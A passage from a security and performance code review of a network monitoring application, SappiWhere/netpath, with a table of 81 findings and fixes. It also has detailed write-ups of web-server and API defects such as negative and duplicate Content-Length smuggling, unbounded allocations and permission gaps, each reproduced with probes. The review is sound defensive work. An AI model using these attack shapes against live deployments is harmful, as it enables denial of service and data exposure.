# SappiWhere 5.9.1 — Full code review

## Summary

This is the second whole-tree review of the application (the first was 4.46.4, fifteen
defects) and the first that took the interface, the browser modules and performance in
with the code. The subject was version 5.9.0 on branch `claude/import-application-code-egu4l1`:
65,334 lines of Python across the 70 modules under `netpath/`, 26,758 lines of vanilla
JavaScript in 16 modules under `netpath/web/static/`, and roughly 4,400 more lines of CSS
and HTML. `demo/` and `tests/` were out of scope as review subjects, though both were used
as fixtures — the ConfigRX redaction finding was proved against `demo/fake_ssh.py`'s own
vendor personas, and the frontend findings against a 812-device instance seeded by
`demo/seed.py`. The application is stdlib-only by policy, so no finding proposes a
dependency, and no fix removes a feature, page, dialog, button, endpoint or setting.

The work ran as seven area reviews — web server core and credentials, HTTP API, poller and
SNMP, data layer, alerts and collectors, frontend core, frontend modules — each against
four lenses in priority order: security, performance, design quality, maintainability, with
correctness defects taken wherever they appeared. Every finding had to be verified against
the running code before it was accepted: a `path:line` citation, the decisive lines quoted,
and a concrete failure scenario. Where a claim was about cost, the reviewer measured it
(probe scripts against a real `WebServer`, real store classes at a million rows, a real
`AlertEngine`, Chromium against the demo fleet); where a claim could not be confirmed it
went under Unconfirmed with what would settle it, not into the findings. The result is
**81 findings — 2 critical, 17 high, 29 medium, 33 low** — plus **30 proposals** (larger
design work deliberately not done in this pass) and **20 unconfirmed items**. The lead
consolidated the seven reports, spot-verified the top finding of each, and assigned the
fixes to file-owned lanes so that parallel fixers never touch the same file; every fix ships
with a test that fails before it and passes after, proved by running the new test against a
stash of the change. All eight lanes (server, data, poller, api, alerts, trapsecrets, frontend core,
frontend modules) are complete; every finding marked *Fixed* below landed with its test.

---

## Findings

81 findings, sorted by severity and then by area. Status:
*Fixed* — landed with a test that failed before it and passes after;
*Proposal* — the lead judged it design work, not a defect to patch now;
*Documented* — answered by a documentation change (RUNBOOK.md).

| ID | Sev | Lens | Finding | Where | Status |
|---|---|---|---|---|---|
| WEB-F1 | critical | security | Negative `Content-Length` bypasses every body cap: unauthenticated, unbounded memory | `netpath/web/server.py:970` | Fixed |
| ALRT-F1 | critical | security, performance | 880 KB of NetFlow options records stalls the flow writer ~15 minutes | `netpath/nfdecode.py:311`, `netpath/collector.py:228` | Fixed |
| WEB-F2 | high | security, performance | Request body read in full (~85 MB) before the route's permission check | `netpath/web/server.py:1206` | Fixed |
| API-F1 | high | security, performance | Three overview routes allocate one dict per bucket with no ceiling | `netpath/web/api.py:2311`, `:2485`, `:6383` | Fixed |
| API-F2 | high | security | `GET …/oid-walk?download=1` destroys server state behind a read gate | `netpath/web/api.py:4914` | Fixed |
| POLL-F1 | high | security | A device's own `entPhySensorScale` hangs a poll worker for ever | `netpath/nodepoll.py:4930` | Fixed |
| POLL-F2 | high | security, correctness | Negative OID arc spins `enc_oid`; a non-ASCII digit freezes the device's status | `netpath/trapdecode.py:784` | Fixed |
| DATA-F1 | high | security | SNMPv3 trap-receiver auth passwords stored and served in the clear | `netpath/snmptrapdb.py:107` | Fixed |
| DATA-F2 | high | performance | Every poll pays a full index scan of the MIB corpus (prefix LIKE) | `netpath/nodesmibdb.py:182`, `:197` | Fixed |
| DATA-F3 | high | performance | The alert engine full-scans `alerts` every five seconds | `netpath/alertsdb.py:2145`, `:2030` | Fixed |
| DATA-F4 | high | performance | `nodes.db` and `nodes_series.db` prune in single unbatched DELETEs | `netpath/nodesdb.py:4395`, `netpath/nodesseriesdb.py:456` | Fixed |
| ALRT-F2 | high | security | `compile_bounded` exempts exactly the regex shape that backtracks exponentially | `netpath/configrx_compliance.py:66` | Fixed |
| ALRT-F3 | high | security, performance | One 64 KB NetFlow datagram decodes to 65,483 flows (~48 MB) | `netpath/nfdecode.py:565` | Fixed |
| ALRT-F4 | high | correctness | An alert muted during its roll-up hold loses its first notification for good | `netpath/alertengine.py:3080` | Fixed |
| FE-F1 | high | correctness | The Nodes pane changes device under the operator 10–20 s after a deep link | `netpath/web/static/nodes.js:6250` | Fixed |
| FE-F2 | high | security, correctness | A crafted `?kiosk=1&rotate=…` link kills the whole application | `netpath/web/static/app.js:4661` | Fixed |
| FE-F3 | high | performance | The Nodes tab re-downloads ~1 MB and blocks the main thread 185–350 ms per tick | `netpath/web/static/nodes.js:6227` | Fixed |
| FE-F4 | high | performance | One open port dialog on a 500-port switch costs ~150 KiB/s | `netpath/web/static/nodes.js:2769` | Fixed |
| FM-F1 | high | security | Alerts rule `key` interpolated into an HTML attribute unescaped | `netpath/web/static/alerts.js:875` | Fixed |
| WEB-F3 | medium | security | Duplicate and loosely-parsed `Content-Length` headers accepted (CL.CL smuggling) | `netpath/web/server.py:947`, `:970` | Fixed |
| WEB-F4 | medium | performance, security | No bound on concurrent connections or handler threads | `netpath/web/server.py:1421` | Fixed |
| WEB-F5 | medium | maintainability | A client reset mid-response prints a full traceback per request | `netpath/web/server.py:896` | Fixed |
| WEB-F6 | medium | security, design | Login delay capped at 5 s, not the documented 30 s, and slept inside the 4-slot semaphore | `netpath/web/api.py:8871` | Fixed |
| API-F3 | medium | performance, security | `GET /api/nodes/duplicates` takes an unclamped `limit`, then queries per device | `netpath/web/api.py:4207` | Fixed |
| API-F4 | medium | correctness, security | Four bulk routes bind one SQL placeholder per id, uncapped | `netpath/web/api.py:6817`, `:7696` | Fixed |
| API-F5 | medium | security | `GET /api/debug` filters its event stream by module, then leaks the same data beside it | `netpath/web/api.py:1573` | Fixed |
| API-F6 | medium | security | SNMP trap rows hand every device's community (and v3 user name) to a read-only account | `netpath/web/api.py:2550` | Fixed |
| API-F7 | medium | performance | `GET /api/configrx/devices` runs one `device_config` query per device | `netpath/web/api.py:7723` | Fixed |
| API-F8 | medium | performance | Upstream-suggestions apply makes three `device()` queries per assignment | `netpath/web/api.py:4058`, `:3933` | Fixed |
| POLL-F3 | medium | security, performance | A table walk is bounded by row count only — not bytes, and mostly not time | `netpath/nodepoll.py:4684`, `:4765` | Fixed |
| POLL-F4 | medium | security | A v3 reply's `msgID` is discarded, so a spoofed Report installs a chosen engine id | `netpath/snmppoll.py:425` | Fixed |
| POLL-F5 | medium | performance | `_poll_interfaces` opens one socket and one credential decrypt per interface | `netpath/nodepoll.py:4438`, `:4516` | Fixed |
| POLL-F6 | medium | correctness, design | `_poll_custom_mib` GETs every object at once, so an auto-assigned MIB yields nothing | `netpath/nodepoll.py:4360` | Fixed |
| DATA-F5 | medium | correctness | Ten search paths pass operator text into LIKE without escaping `%` and `_` | `netpath/nodesdb.py:1688`, +9 sites | Fixed (the two `snmptrapdb` sites in 5.11.0) |
| DATA-F6 | medium | design | The four stores holding operator credentials run `synchronous=NORMAL` | `netpath/sqlitebase.py:414` | Fixed |
| ALRT-F5 | medium | security | ConfigRX redaction leaves SNMP communities in the clear for Siemens and Ubiquiti | `netpath/configrx_redact.py:21` | Fixed |
| ALRT-F6 | medium | performance | `_evaluate_dhcp_thresholds` reads every DHCP lease every five seconds | `netpath/alertengine.py:1539` | Fixed |
| ALRT-F7 | medium | performance | `_drain_ipam_conflicts` reads the whole conflicts table each tick | `netpath/alertengine.py:1006` | Fixed |
| ALRT-F8 | medium | security, design | The flow collector logs an unthrottled ERROR per undecodable datagram | `netpath/collector.py:144` | Fixed |
| ALRT-F9 | medium | security | The webhook URL and its headers are stored and served in the clear | `netpath/alertsdb.py:279`, `:1668` | Contained (full fix is ALRT-P1) |
| ALRT-F10 | medium | performance | Rollup absorb paths re-query the rules table instead of the per-tick snapshot | `netpath/alertengine.py:2357`, `:2443` | Fixed |
| FE-F5 | medium | performance | Bridge & RF rebuilds its charts and re-fetches every RF series each tick | `netpath/web/static/nodes.js:3204` | Fixed |
| FE-F6 | medium | performance | `App.deviceIndex()` pulls the whole unpaged fleet — 1.5 MB at 812 devices | `netpath/web/static/app.js:693` | Fixed |
| FE-F7 | medium | security | Two client-built CSV exports skip the formula-injection guard | `netpath/web/static/nodes.js:3776` | Fixed |
| FM-F2 | medium | security | Wireless radio `channel` written into `#wl-detail` innerHTML unescaped | `netpath/web/static/wireless.js:213` | Fixed |
| FM-F3 | medium | performance | MAPPER's node drag redraws every attached link per pointermove | `netpath/web/static/mapper.js:1528` | Fixed |
| FM-F4 | medium | performance | Debug's event filter re-reads the DOM once per event, per draw | `netpath/web/static/debug.js:221` | Fixed |
| FM-F5 | medium | performance | The chart brush rebuilds the whole SVG on every pointermove | `netpath/web/static/netflow.js:433`, `netpath/web/static/netpath.js:926` | Fixed |
| WEB-F7 | low | security | SSH-terminal usernames reach the device event log untruncated, up to 2 MB | `netpath/sshterm.py:486` | Fixed |
| WEB-F8 | low | security, maintainability | `NETPATH_SECRET_PASSPHRASE_FILE` ownership is not checked, though the document says it is | `netpath/secretstore.py:57` | Fixed |
| WEB-F9 | low | security | `_has_ssh_write` / `_has_web_write` fail open on a database error | `netpath/sshterm.py:781`, `netpath/webrelay.py:956` | Fixed |
| WEB-F10 | low | correctness | `bump_config()` is a non-atomic read-modify-write | `netpath/web/service.py:810` | Fixed |
| WEB-F11 | low | design, correctness | `WebServer.stop()` does not wait for in-flight requests | `netpath/web/server.py:1463` | Fixed |
| WEB-F12 | low | performance, maintainability | Static files are unattributed in the latency table and cost two stats each | `netpath/web/server.py:1041`, `:1336` | Fixed |
| WEB-F13 | low | security | The self-update's vendored CA bundle only ever widens the trusted set | `netpath/selfupdate.py:114` | Proposal |
| API-F9 | low | performance | `GET …/devices/(\d+)/upstream` pulls the whole fleet's `SELECT *` for a dropdown | `netpath/web/api.py:9706` | Fixed |
| API-F10 | low | correctness | `wsock._drain` uses the one `select` call the module documents as unsafe | `netpath/web/wsock.py:463` | Fixed |
| API-F11 | low | design, maintainability | Inconsistent existence checks and one wrong exception type across sibling handlers | `netpath/web/api.py:4932`, `:9663` | Fixed |
| API-F12 | low | security | The request body is read before the permission gate (api-side view of WEB-F2) | `netpath/web/server.py:1206` | Fixed |
| API-F13 | low | performance | `post_alerts_bulk_maintenance` does two queries per device over an uncapped scope | `netpath/web/api.py:6689` | Fixed |
| POLL-F7 | low | performance | `settings()` is uncached and read twice per column walk | `netpath/nodepoll.py:4683`, `:7232` | Fixed |
| POLL-F8 | low | performance, maintainability | Six per-device / per-job caches are never pruned | `netpath/nodepoll.py:2479` | Fixed |
| POLL-F9 | low | security | A refused community string is printed verbatim into the device row and event log | `netpath/nodepoll.py:468` | Fixed |
| DATA-F7 | low | maintainability | Bulk id lists in `alertsdb` and `configrxdb` bypass `sqlitebase.id_chunks` | `netpath/alertsdb.py:2188`, `netpath/configrxdb.py:561` | Fixed |
| ALRT-F11 | low | performance | `_read_until_prompt` re-joins the whole capture on every recv | `netpath/configrx.py:543` | Fixed |
| ALRT-F12 | low | correctness | Notification counters incremented from sender threads without a lock | `netpath/alertengine.py:390`, `:419` | Fixed |
| ALRT-F13 | low | performance | `_source_name` does one `app.db` query per drained syslog/trap row | `netpath/alertengine.py:526` | Fixed |
| ALRT-F14 | low | correctness | `_sweep_netpath_alerts` only ever sees the first 300 open alerts per rule | `netpath/alertengine.py:1888` | Fixed |
| ALRT-F15 | low | security | Syslog TCP accepts and slots a connection before the allow list is consulted | `netpath/syslogd.py:256` | Fixed |
| ALRT-F16 | low | correctness | Per-source syslog rate buckets mutated from several threads without a lock | `netpath/syslogd.py:187` | Fixed |
| ALRT-F17 | low | security | C1 control characters survive syslog sanitisation | `netpath/syslogparse.py:49` | Fixed |
| ALRT-F18 | low | security | The trap receiver is an unauthenticated UDP reflector for inform acknowledgements | `netpath/snmptrapd.py:248` | Documented |
| FE-F8 | low | correctness, design | Three dialog titles are HTML-escaped twice; one stays wrong | `netpath/web/static/nodes.js:1709`, `:3110`, `:5610` | Fixed |
| FE-F9 | low | design | Three status lines are silent to assistive technology | `netpath/web/static/nodes.js:6302`, `:5540`, `:5028` | Fixed |
| FE-F10 | low | security | `domValueCell` is the one cell in the device dialogs that does not escape | `netpath/web/static/nodes.js:1504` | Fixed |
| FM-F6 | low | performance | Alerts re-fetches four configuration endpoints every 10 s | `netpath/web/static/alerts.js:1775` | Fixed |
| FM-F7 | low | performance | 10 Hz fastTicks doing layout and unconditional property writes | `netpath/web/static/netpath.js:911`, `netpath/web/static/mapper.js:1788` | Fixed |
| FM-F8 | low | performance, design | Late-filled `<select>`s rebuilt with innerHTML on every poll | `netpath/web/static/alerts.js:1877`, `wireless.js:476`, `configrx.js:1599` | Fixed |
| FM-F9 | low | correctness | `editTemplate` called with a template object where it takes an id | `netpath/web/static/alerts.js:1405` | Fixed |
| FM-F10 | low | maintainability | IPAM's refresh has no tab guard; Wireless has one only before its awaits | `netpath/web/static/ipam.js:1172`, `wireless.js:466` | Fixed |
| FM-F11 | low | maintainability | `ssh.html`'s comment names Escape as the keyboard exit; the code says Ctrl+F6 | `netpath/web/static/ssh.html:26` | Fixed |

---

## Web server core, process model and credentials

`netpath/web/server.py`, `service.py`, `auth.py`, `permissions.py`, `secretstore.py`,
`dpapi.py`, `ldapclient.py`, `webrelay.py`, `selfupdate.py`, `sshterm.py`, `hostkeys.py`,
`console.py`, `__main__.py`.

The credential machinery is the strongest part of the tree: scrypt at N=2^17 with a
constant-cost decoy hash, a portable secret store whose parameter validation refuses the
OpenSSL overflow shapes by name, an LDAP client that rejects rather than escapes DN
metacharacters, a self-update tarball guard that drops links and devices and resolves every
member against `realpath(dest)`, and a session cookie that matches `CREDENTIAL-SECURITY.md`
§2 field for field. What the layer below it does not do is validate its own message framing:
the critical finding and two of the mediums are all `Content-Length` parsing, and the
reviewer's proposal P1 is to make that one verdict computed once per request. The second
theme is bounds on the process: no connection ceiling, no wait for in-flight requests at
shutdown, and two liveness checks that fail open where their neighbours fail closed. Every
finding here except WEB-F6 was fixed in the server lane.

**WEB-F1 (critical, security).** `_body()` at `server.py:970` parses `Content-Length` with a
bare `int()` and then guards only `not length` and `length > cap`; a negative value passes
both and reaches `self.rfile.read(-1)`, which reads to EOF into one `bytes` object. `/api/login`
is in `PUBLIC_API`, so this needs no session. `probe3.py` streamed 400 MB after a
`Content-Length: -1` header and took RSS from 39,872 kB to 559,752 kB; every `recv` resets
the 30-second socket timeout, so the stream can be held open indefinitely, and each
connection has its own thread. The same header on a request refused before its handler is
worse: `_drain_request_body` (`:951`) returns on `length <= 0` without draining or closing,
so the "body" is parsed as the next request — `probe4.py` case B got a 415 and then a full
200 for the `GET /login` hidden in the body, on one connection. Fixed: one range check that
raises rather than reads, and `close_connection = True` on the drain side; a malformed
length is now a 400 before a byte is read.

**WEB-F2 (high, security/performance).** The route loop reads the body first and evaluates
the gate second (`server.py:1206-1213`), and `_body_limit` raises the cap to
`max(16 MB, max_mib_bundle_bytes*4/3 + 64 KiB)` ≈ 85 MB for any path starting
`/api/nodes/mibs`. `probe8.py`, as an account holding only `{"netpath": "read"}`, got
`400 {"error": "Request body of 94,371,840 bytes exceeds the 89,544,021 byte limit"}` — a
message about the server's configured limit, for a caller with no `nodes` grant — and a
30 MB POST moved RSS from 39,980 kB to 131,940 kB before the 403. Only
`_password_requirement` and `_settings_requirement` need the body to decide; the other ~250
routes carry a fixed `(module, level)`. Fixed: the static requirement is evaluated before
the body is read, the two callable ones keep today's order, and the raised MIB ceiling now
applies only to the upload itself rather than to every path under `/api/nodes/mibs`.

**WEB-F3 (medium, security).** Both body paths use `headers.get("Content-Length")`, which
returns the first of several values, and `int()`, which accepts `+5`, `" 5 "` and `3_1`.
`probe2.py` sent one `POST /api/login` carrying both `Content-Length: 45` and
`Content-Length: 5` with a complete `GET /login` appended: two responses came back on one
connection. `NETWORK-AND-STORAGE-REQUIREMENTS.md:193-201` contemplates a reverse proxy, and
a front end honouring the last value is the classic CL.CL differential — here meaning a
request attributed to another operator's session cookie. Fixed with one parser shared by
`_body` and `_drain_request_body`: ASCII digits only, a single distinct value, non-negative;
disagreeing values are a 411.

**WEB-F4 (medium, performance/security).** `ThreadingHTTPServer` with `daemon_threads = True`
spawns one unbounded thread per accepted connection, `protocol_version = "HTTP/1.1"` keeps
each alive, and the 30-second `Handler.timeout` is per-`recv`. `probe5.py` opened 300 sockets
with partial request lines and the thread count went from 2 to 302. On top of that the
pre-handler drain read up to `MAX_BODY_BYTES` (16 MB) before writing the refusal, though its
own docstring calls these "small bodies". Fixed: drain capped at 64 KiB above which the
connection closes, and a bounded semaphore in `process_request` giving a ceiling of 512
simultaneous connections, slots returned when a connection finishes.

**WEB-F5 (medium, maintainability).** `self.wfile.write(body)` at `server.py:896` is
unguarded, so a client reset escapes `do_GET` and `socketserver`'s `handle_error` prints a
traceback. `probe6.py` closed three complete `GET /login` requests with `SO_LINGER (1, 0)`
and captured 5,007 bytes of stderr — ~1.67 KB per aborted request. `app.js` polls
`/api/state` every two seconds in every open tab, so closing a tab does this; under
`--headless` beneath systemd or NSSM it buries the tracebacks that matter. Fixed:
`handle_error` swallows `BrokenPipeError`, `ConnectionResetError` and `TimeoutError` only,
and genuine faults still print.

**WEB-F6 (medium, security/design).** Three problems in one place. `CREDENTIAL-SECURITY.md:109-117`
documents a per-failure delay of `min(30s, 2^(failures-5))`, and `LoginThrottle.delay_for`
returns up to 30 — but `api.py:8874` truncates it with `time.sleep(min(delay, 5))`, so the
documented ceiling is never reached. That sleep sits inside `with _LOGIN_SLOTS:`, a global
`threading.Semaphore(4)`, so a throttled attempt occupies one of only four password
verification slots while doing nothing — roughly forty addresses holding 5-second penalties
is enough to block every real sign-in, turning the throttle into the attacker's lever. And
the document does not mention the 20-failure hard lockout (HTTP 429 for the rest of a
15-minute window, counted per source address as well as per username), which matters to a
site NATed behind one address. Assigned to the api lane: move the delay above the semaphore,
where the lockout check at `api.py:8861` already sits for exactly this reason, and document
the 5-second cap as shipped plus the per-address lockout in §1.

**WEB-F7 (low, security).** `sshterm.py:490` takes the SSH username off the socket with no
length bound and `_audit_auth_failure` interpolates it into a headline handed to
`nodes_db.record_device_event`, a bare INSERT with no cap; a WebSocket text message may be
`wsock.MAX_MESSAGE_BYTES` = 2 MiB. `api.post_login` guards the identical hazard explicitly.
Fixed by clamping to 128 characters.

**WEB-F8 (low, security/maintainability).** `CREDENTIAL-SECURITY.md:1110-1116` says the
passphrase file is refused until it is `chmod 600` **and owned by the account the service
runs as**; `secretstore.py:72` checks only `mode & 0o077`. Fixed: one `os.stat` result now
also tests `st_uid not in (0, os.getuid())` on POSIX, so the enforced rule matches the stated
one.

**WEB-F9 (low, security).** `sshterm.py:784` and `webrelay.py:959` both `return True` when
`permissions_for` raises — "a database that cannot answer is not a verdict" — while the web
session check one line above fails closed. `CREDENTIAL-SECURITY.md` §7 says a revoked
permission ends a live shell within seconds; with `app.db` unreadable it never does. Fixed
as a bounded fail-open: about a minute of consecutive failures (12 misses at the 5-second
re-read), then closed with one log line.

**WEB-F10 (low, correctness).** `service.py:812` is `self.config_version += 1` with no lock,
called from every settings save, every collector toggle and every user create. The browser
refetches `/api/config` only when the number moves — `test_static_headers.py:186-191` pins
that contract — so two simultaneous saves can record as one and leave one operator editing
from a stale dialog. Fixed by serialising the counter.

**WEB-F11 (low, design/correctness).** `daemon_threads = True` means CPython's
`socketserver._Threads.append` never records request threads, so `server_close()` joins
none; `console.run_teardown`'s comment claims the ordering prevents "a request in flight
against a closing store", and it does not. `probe5.py` showed 300 live handler threads that
`stop()` left running. Fixed: `stop()` now waits up to two seconds for in-flight requests
before the stores are closed.

**WEB-F12 (low, performance/maintainability).** `_route_template` is set only when a compiled
pattern matches and `_static` runs only when none did, so the Debug page's per-route latency
folds `app.js` (283 KB), `index.html`, every stylesheet and every 404 into one
`GET <unrouted>` row — static serving is invisible to the instrument built to find slow
paths. `_static` also does `os.path.isfile` and then `StaticCache.get`'s `os.stat`, two stats
where the cache's docstring promises one. Fixed: a `<static>` route key and one file check.

**WEB-F13 (low, security) — Proposal.** `selfupdate._ssl_context()` starts from
`ssl.create_default_context()` and then *adds* the 137 roots in `netpath/cacert.pem`, so a CA
an administrator has distrusted in the OS store is trusted again for the one connection that
decides what code this host runs next. The lead left it as a proposal: the docstring frames
the redundancy deliberately, and a fallback-only context could break updates on a host whose
system store is stale. `updates_enabled` is off by default.

### Verified sound

- Static path traversal: `normpath` + `commonpath` against `STATIC_DIR` refuses `/../`,
  `%2e%2e`, `/static/../../` and a Windows drive-letter path.
- Response-header injection: a bare CR in the request line is rejected by `http.server`'s own
  parser with a 400 before `_route` runs.
- Chunked bodies refused with 411 in both body paths, and the drain closes the connection —
  the TE.CL smuggle is closed.
- Session cookie: `HttpOnly; SameSite=Strict; Path=/`, `Secure` only under TLS, host-only,
  `Max-Age` bounded to 1–168 h. CSRF: `_same_origin` on scheme and netloc, `Sec-Fetch-Site`
  honoured, JSON content-type required on every state-changing method, `require_origin` on
  the WebSocket upgrade.
- API tokens: 256 bits from `secrets.token_urlsafe`, SHA-256 stored, indexed lookup then
  `hmac.compare_digest`, never minted from a cookie, `touch_api_token` rate-limited to one
  write a minute, `must_change` enforced for tokens as well as cookies.
- Password hashing: scrypt N=2^17 r=8 p=1 with `maxmem=N*r*256`, PBKDF2-SHA256 at 600,000
  fallback, `needs_rehash` guarded by `auth_source == "local"`. The decoy hash is computed
  once under a lock and reused.
- Portable secret store: `_sane_scrypt_params` refuses out-of-range/non-power-of-two `n` and
  a wide `p`; MAC verified before any plaintext is returned; cache keyed on the passphrase
  digest and bounded to 8 entries; `_install_salt` uses `O_EXCL`.
- DPAPI dispatch checks `secretstore.MAGIC` before the platform, so a portable blob is never
  handed to `CryptUnprotectData`; `protect` raises rather than falling back to plaintext.
- LDAP: `safe_dn_username` rejects rather than escapes; empty-password bind refused in two
  places; `ldaps://` uses a verifying context with the connect timeout carried onto the
  handshake; `_recv_message` caps a claimed length at 1 MiB.
- TLS server context: TLS 1.2 minimum, 17 forward-secret AEAD suites, no 3DES/RC4/aNULL,
  HSTS only under TLS.
- Update tarball guard and job lifecycle: `_safe_extract` drops links and devices and resolves
  every member against `realpath(dest)`; `start_job` refuses a second concurrent install;
  `_run_job`'s `finally` guarantees a quiesced process restarts.
- Host keys compared by key bytes, not algorithm name; replacing one needs `ssh: write`
  re-checked at the moment of the answer.
- SSH terminal and web relay bounds: 16 sessions / 16 tunnels, 4 per account, auth-failure
  window checked before the device is contacted, idle capped to the web session's idle; the
  relay's HTTP framer declines on every smuggling-relevant shape.
- `EventLog`, `AccessLog` and `LoginThrottle` all bound their growth — the four unbounded
  paths 4.46.4 cared about stay closed.
- `_body`'s underscore filter runs before any handler sees the body, so `_agent`/`_username`/
  `_client` cannot be spoofed.
- `login.js`'s redirect always starts with a literal `/`; `boot.js` validates the stored theme
  against a fixed list and the tab against `/^[a-z]+$/`.

---

## HTTP API

`netpath/web/api.py` (9,745 lines, 425 top-level functions) and `netpath/web/wsock.py`.

The route table itself is correct: every POST/PUT/DELETE carries `(module, WRITE)` except
seven deliberate exceptions, and each of the seven `None`-gated routes filters per module
inside the handler. The reviewer found **no missing gate in the table**; every finding here
is a handler whose behaviour does not match the gate it was given, or a handler that lets the
caller choose how much work the server does. SQL injection, path traversal, CSRF, credential
serialisation and the CSV formula guard were each audited end to end and found sound. Two
patterns account for most of the list: caller-chosen allocation with no ceiling (F1, F3, F4,
F13), and per-row work where a batch helper already exists a few lines away (F3, F7, F8, F9,
F13). Except for the two items the server lane already carried, this whole area is with the
api fixer, which starts after the data lane so it can use `set_maintenance_many` and
`id_chunks`.

**API-F1 (high, security/performance).** `get_syslog_overview` (`api.py:2311`),
`get_snmp_overview` (`:2485`) and `get_alerts_overview` (`:6383`) read `t0`/`t1`/`bucket`
straight off the query string with bare `_num`, never through `_window`, and nothing caps the
bucket count; each `histogram()` then allocates `slots = int((t1 - start) / bucket_s) + 1`
dicts before running any query. `probe3.py` against the handlers:
`span=1e8 bucket=60 -> 1,666,667 buckets, 7,907 ms, rss 614 MB` for alerts and
`7,053 ms, rss 1,087 MB` for syslog. `probe7.py` over real HTTP as a `{alerts,snmp,syslog}: read`
account at a deliberately modest `t1=1e7` got three 11 MB responses. The span is linear in
the caller's `t1`, nothing rate-limits the routes, and the threading server will run several
at once. The fix routes all three through `_window` and then widens the bucket the way
`_flow_bucket` already does — `bucket = max(bucket, 60.0, (t1-t0)/HIST_MAX_BUCKETS)` with
`HIST_MAX_BUCKETS = 5000`, the value `FLOW_MAX_BUCKETS` already uses. The shipped tabs send
24 h / 3600 s, so no screen changes.

**API-F2 (high, security).** `get_nodes_device_oid_walk` calls
`service.node_poller.forget_oid_walk(int(device_id))` at `api.py:4927` on the `download=1`
path, while the route is gated `("nodes", R)` and the table's own comment says "starting and
cancelling one need write access; watching it does not." Downloading is neither. `probe6.py`,
signed in as an account granted only `nodes: read`, downloaded the file, the walk was
dropped, the next poll returned `{"walk": null}`, and the same account was refused the write
that would let it recreate what it had just destroyed. The fix makes the forget conditional
on `_may_read_secrets(service, params, "nodes")`, so a reader gets the file and the walk
survives for its owner, and adds the missing `_require(device)` while there.

**API-F3 (medium, performance/security).** `get_nodes_duplicates` is the only list route in
the file that does not use `_page`: `limit = int(_num(params, "limit", 200))` at `api.py:4211`,
neither floored nor capped, and each returned pair costs two more `nodes_db.device()` reads,
each taking the nodes.db lock. On a 1,000-device fixture with 400 shared `sys_name`s,
`?limit=1000000` returned 79,800 pairs after 159,600 `device()` calls in 4,403 ms; the default
200 took 854 ms and 400 calls. Fix: `_page(params, 200, 2000)` plus one `devices_by_ids` over
the page. The shipped Duplicates button sends no `limit` at all.

**API-F4 (medium, correctness/security).** `_bulk_alert_ids` (`api.py:6817`) and
`post_configrx_backups_bulk_delete` (`:7696`) accept an unbounded id list, and their callees
build `",".join("?" * len(ids))` — `alertsdb.py:2807`, `:3033`, `:2187` and
`configrxdb.py:565` — where `sqlitebase.id_chunks` exists precisely for this and whose comment
says a request that works on one operator's install fails on another's with "too many SQL
variables", answered as a 500. `probe5.py` with the connection limit set to the pre-3.32 value
of 999: 900 ids fine, 1,000 and 2,000 `OperationalError`, while the Nodes equivalent survived
the identical limit because nodesdb chunks. The Alerts list's own page size is 1,000, so
select-all plus Acknowledge is the reproduction. Fix: the `_bulk_device_ids` cap in the API
layer and `id_chunks` inside the existing single lock and commit in the two stores (the store
half is done — see DATA-F7).

**API-F5 (medium, security).** `get_debug` filters its event stream by module with an explicit
comment about why (`api.py:1612-1623`: device names, DHCP labels, ConfigRX detail, sign-in
history), and then returns `workers`, `dns_workers`, `ipam_workers`, `node_workers`,
`discovery_scans`, `node_counters` and `targets` unfiltered beside it. `probe4.py` with an
account granted `{'debug': 'read'}` only: `events visible: 0`, and the NetPath target
inventory returned in full, hostnames included. Fix: gate each block on the module it belongs
to — `workers`/`targets` on `netpath`, `node_*` and `discovery_scans` on `nodes`,
`ipam_workers` on `ipam`, `dns_workers` on `settings` — emitting `[]` rather than 403, the
same "a section the account cannot read is absent" contract `get_state` uses.

**API-F6 (medium, security).** `_snmp_trap_rows` emits `"community": row["community"] or ""`
(`api.py:2550`) with no `_may_read_secrets` check, on both `GET /api/snmp/traps` and the CSV
export, at `snmp: read`. The stored value is the sending device's own trap community, and for
v3 the same column holds the USM user name (`snmptrapd.py:221-235`). This contradicts
`_community_fields`' own written policy at `api.py:3083-3097` — every other serialiser that
carries a community routes it through that helper. Fix: thread `reveal` into `_snmp_trap_rows`,
emit `has_community` beside a blanked value, and blank the CSV column for a non-reveal caller.
The reviewer noted that `snmp_settings["accepted_communities"]` (this server's allow list)
reaches any `snmp: read` account through `/api/config` as well; the lead's verdict was to fix
the trap rows and leave the allow list as it is, recorded here rather than changed silently.

**API-F7 (medium, performance).** `get_configrx_devices` (`api.py:7723`) calls
`_configrx_device_json`, whose first line is `service.configrx_db.device_config(row["id"])` —
one query per device on an unpaged route, each taking configrx.db's single write lock, which
the backup worker also holds while writing captures. The one-query helper is used four lines
of code away by `get_configrx_overview`. Measured: 300 devices gave
`{'nodes_db.devices': 1, 'configrx_db.device_config': 300}`; at 1,000 devices the route took
26.0 ms against 10.4 ms for `devices() + all_device_configs()` — 2.5× wall clock and 1,000
fewer lock acquisitions. Fix: read the map once and give `_configrx_device_json` an optional
`config` parameter, defaulting to today's lookup for the single-device caller.

**API-F8 (medium, performance).** `post_nodes_upstream_suggestions_apply` costs three
`device()` reads per assignment — the existence loop at `api.py:4081`, `_clean_upstream_id`'s
own call at `:4385`, and `_find_upstream_cycle`'s `upstream_of` at `:4038` — against an
`UPSTREAM_APPLY_MAX_ASSIGNMENTS` of 2,000; `_upstream_suggestion_json` adds one more per
suggestion for a listing capped at 2,000. Measured exactly: 50 assignments produced
`{'nodes_db.device': 150}`. Fix: one `devices_by_ids` prefetch map consulted by both helpers,
with the fallback kept. The validation and the cycle refusal stay byte-for-byte identical.

**API-F9 (low, performance).** `api.py:9722` iterates `service.nodes_db.devices()` to build a
three-key dropdown — the unbounded `SELECT *` including `sys_descr` banners and the
vendor-evidence blob — where `device_summaries()` exists for exactly this and is already used
by `get_mapper_map_candidates`. One-line fix.

**API-F10 (low, correctness) — Fixed.** `wsock.py:463` uses `select.select`, the one call the
module's own comment at `:61-66` documents as unsafe ("it raises ValueError for a descriptor
at or above FD_SETSIZE (1024), and this application reaches that number on an ordinary busy
appliance"); the `except (OSError, ValueError, …)` at `:467` makes the failure silent, and the
drain is what turns a reset back into an orderly FIN so the peer receives the close frame
naming the reason. Fixed in the server lane by using the module's own `_poll_readable(0)`.

**API-F11 (low, design/maintainability).** `delete_nodes_device_oid_walk`,
`post_nodes_device_identify` and `delete_nodes_device_identify` do not call
`_require(service.nodes_db.device(device_id), "device")` where every sibling on the same
device does, so `POST /api/nodes/devices/99999/identify` answers 200 where `/99999/poll`
answers 400. Separately `get_dashboard_offenders` (`api.py:9663`) raises bare
`PermissionError`, which `server.py:1289` answers **401** — the answer `permissions.Forbidden`
